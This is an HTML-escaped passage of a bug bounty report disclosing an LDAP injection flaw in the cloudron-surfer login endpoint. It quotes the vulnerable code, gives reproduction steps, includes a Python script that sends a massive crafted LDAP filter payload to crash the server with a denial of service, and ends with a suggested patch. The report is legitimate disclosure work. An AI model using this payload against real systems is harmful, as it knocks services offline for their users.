class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eInvalid credentials\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n                        \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eusername\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n                    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// https://github.com/nebulade/surfer/blob/master/src/auth.js#L107\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L113\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eexports\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogin\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003everifyUser\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"c1\"\u003e//\u0026lt;-- USER CONTROLLED INPUT\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e401\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eInvalid credentials\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eaccessToken\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eLOGIN_TOKEN_PREFIX\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003euuid\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\n        \u003cspan class=\"nx\"\u003etokenStore\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eaccessToken\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e500\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n            \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpSuccess\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e201\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003eaccessToken\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eaccessToken\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"p\"\u003e}));\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// https://github.com/nebulade/surfer/blob/master/server.js#L76\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// https://git.cloudron.io/cloudron/surfer/-/blob/master/server.js#L75\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"nx\"\u003erouter\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epost\u003c/span\u003e  \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/api/login\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eauth\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogin\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eTo test this app on a real live system, you need first to install \u003ccode\u003eCloudron\u003c/code\u003e (\u003ca title=\"https://cloudron.io/get.html\" href=\"/redirect?url=https%3A%2F%2Fcloudron.io%2Fget.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cloudron.io/get.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and then install the \u003ccode\u003eSurfer\u003c/code\u003e app (\u003ca title=\"https://cloudron.io/store/io.cloudron.surfer.html\" href=\"/redirect?url=https%3A%2F%2Fcloudron.io%2Fstore%2Fio.cloudron.surfer.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cloudron.io/store/io.cloudron.surfer.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). In order to install the \u003ccode\u003eCloudron\u003c/code\u003e app you need first a domain. In this case the web interface is available under the \u003ccode\u003ehttps://[appdomain]/_admin/\u003c/code\u003e location.\u003c/p\u003e\n\n\u003cp\u003eIstead of the above setting, I tested the app locally. \u003cbr\u003e\nBelow steps to reproduce the vulnerability.\u003c/p\u003e\n\n\u003cp\u003eAs mentioned in another project (\u003ca title=\"https://github.com/nebulade/meemo#development\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnebulade%2Fmeemo%23development\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nebulade/meemo#development\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e ), to simulate a LDAP server for users authentication, I used a test server provided by the same author (\u003ca title=\"https://github.com/nebulade/ldapjstestserver\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnebulade%2Fldapjstestserver\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nebulade/ldapjstestserver\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). (you can find attached).\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ecreate a directory for testing\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003emkdir poc\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecd poc/\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003einstall \u003ccode\u003ecloudron-surfer\u003c/code\u003e module:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e \u003ccode\u003enpm i cloudron-surfer\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003estart the LDAP test server:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e \u003ccode\u003enode ldapjstestserver.js\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003estart the \u003ccode\u003esurfer\u003c/code\u003e app locally (we need to setup some enviroment variables to enable the LDAP authentication):\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eCLOUDRON_LDAP_BIND_DN=\u0026quot;cn=admin,ou=users,dc=example\u0026quot; CLOUDRON_LDAP_BIND_PASSWORD=\u0026quot;password\u0026quot; CLOUDRON_LDAP_USERS_BASE_DN=\u0026quot;ou=users,dc=example\u0026quot; CLOUDRON_LDAP_URL=\u0026quot;ldap://localhost:3002\u0026quot; node node_modules/cloudron-surfer/server.js\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBefore performing the attack let\u0026#39;s first check that everything works as expected:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003evisit \u003ccode\u003ehttp://localhost:3000/_admin/\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eenter \u003ccode\u003enormal\u003c/code\u003e and \u003ccode\u003etest\u003c/code\u003e respectively in the \u003ccode\u003eusername\u003c/code\u003e and \u003ccode\u003epassword\u003c/code\u003e fields and the click enter\u003c/li\u003e\n\u003cli\u003elogout \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBefore performing the attack let\u0026#39;s first check that everything works as expected even with a long value for \u003ccode\u003eusername\u003c/code\u003e:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003evisit \u003ccode\u003ehttp://localhost:3000/_admin/\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003erun the following \u003ccode\u003epython\u003c/code\u003e script (\u003ccode\u003erun_safe.py\u003c/code\u003e):\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;http://localhost:3000/api/login\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e  \u003cspan class=\"s\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;*)\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;(cn=*)\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e700000\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;(cn=*\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Payload\u0026#39;s length: {len(payload)} characters\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026#39;password\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;pass\u0026#39;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eenter \u003ccode\u003enormal\u003c/code\u003e and \u003ccode\u003etest\u003c/code\u003e respectively in the \u003ccode\u003eusername\u003c/code\u003e and \u003ccode\u003epassword\u003c/code\u003e fields and the click enter\u003c/li\u003e\n\u003cli\u003elogout \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eReproduce the attack:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003evisit \u003ccode\u003ehttp://localhost:3000/_admin/\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003erun the following \u003ccode\u003epython\u003c/code\u003e script (\u003ccode\u003erun.py\u003c/code\u003e):\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;http://localhost:3000/api/login\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;*)\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;(cn=*)\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e700000\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;(cn=*\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Payload\u0026#39;s length: {len(payload)} characters\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026#39;password\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;pass\u0026#39;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003ethe page will load until the server crashes. After some time you will get the following error:\n\u003ccode\u003eFATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIf an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"poc.mov\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3Ye5mgaQdPKPn9yNzGtceDcB?response-content-disposition=attachment%3B%20filename%3D%22poc.mov%22%3B%20filename%2A%3DUTF-8%27%27poc.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070943Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=2543ba4fa5961032b13a9fd3ef084c1a4096d45afff15aa837d4e262077db650\" data-attachment-type=\"video/quicktime\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3Ye5mgaQdPKPn9yNzGtceDcB?response-content-disposition=attachment%3B%20filename%3D%22poc.mov%22%3B%20filename%2A%3DUTF-8%27%27poc.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070943Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=2543ba4fa5961032b13a9fd3ef084c1a4096d45afff15aa837d4e262077db650\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eSanitize the user input before using it to build LDAP filters.\u003c/p\u003e\n\n\u003cp\u003ePossible solution could be for example this one (taken from another project):\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eGithub Issue: \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fvesse%2Fnode-ldapauth-fork%2Fissues%2F21\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eVulnerable to ldap injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGithub Commit: \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fvesse%2Fnode-ldapauth-fork%2Fcommit%2F3feea43e243698bcaeffa904a7324f4d96df60e4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSanitize user input: Replace the specific special characters with codes as defined in LDAP specification.\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eInspired by the same issue (\u003ca title=\"https://github.com/vesse/node-ldapauth-fork/issues/21\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fvesse%2Fnode-ldapauth-fork%2Fissues%2F21\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/vesse/node-ldapauth-fork/issues/21\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), here there are the RFC specifications (\u003ca title=\"https://tools.ietf.org/search/rfc4515#section-3\" 